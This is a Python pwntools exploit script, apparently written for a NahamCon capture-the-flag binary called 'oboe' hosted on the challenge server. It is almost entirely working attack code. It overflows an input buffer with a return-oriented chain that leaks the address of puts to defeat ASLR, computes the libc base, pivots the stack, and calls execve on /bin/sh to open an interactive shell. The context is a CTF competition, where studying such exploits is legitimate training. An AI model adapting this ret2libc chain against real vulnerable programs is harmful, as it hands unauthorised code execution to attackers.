#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template oboe --host challenge.nahamcon.com --port 31968
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('oboe')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 30934)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
init-peda
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

io.sendlineafter(b':', b'A'*64) 
io.sendlineafter(b':', b'A'*64) # for padding

context.log_level = 'debug'

padding = 10

libc = exe.libc

pop_ebx_ebp = 0x0804858b
writable = 0x0804a000 + 0x205
leave_ret = 0x08048485

payload = flat([
    b'A' * padding,
    exe.sym['puts'],
    pop_ebx_ebp,
    exe.got['puts'], # ebx
    writable, # ebp
    exe.sym['getInput'],
    leave_ret,
    writable + 4
])

payload += b"A" * (63 - len(payload))

io.sendlineafter(b':', payload)

io.recvuntil(b"AAAAAAAAA\n")

leak = u32(io.recv(4))
libc.address = leak - libc.sym['puts']

info('libc.address: %s' % hex(libc.address))

payload = flat([
    libc.sym['execve'],
    pop_ebx_ebp,
    next(libc.search(b'/bin/sh')),
    0x0,
])

io.sendline(payload)

io.interactive()

